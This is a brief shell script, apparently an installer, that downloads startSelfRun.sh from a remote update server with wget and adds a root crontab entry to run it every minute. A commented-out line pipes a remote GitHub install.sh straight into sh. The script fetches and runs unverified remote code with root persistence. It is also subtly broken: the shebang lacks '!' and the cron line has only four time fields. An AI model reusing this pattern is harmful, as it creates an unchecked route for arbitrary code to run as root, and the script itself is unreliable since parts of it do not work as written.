#/bin/sh
#desc:
#

if [ ! -f /data/java/startSelfRun.sh ]; then
    wget -O /data/java/startSelfRun.sh http://update.bwtob.com:8086/bw_register/ResourceController/downloadResource?id=226-1

    echo "* * * * sh /data/java/startSelfRun.sh" >> /var/spool/cron/root
    
    ps -ef|grep crond|grep -v grep
    if [ $? -ne 0 ]; then
        echo 'crontab service is not running!!!'
    fi
fi

# sh -c "$(curl -fsSL https://raw.githubusercontent.com/xu-github/test/master/install.sh)"
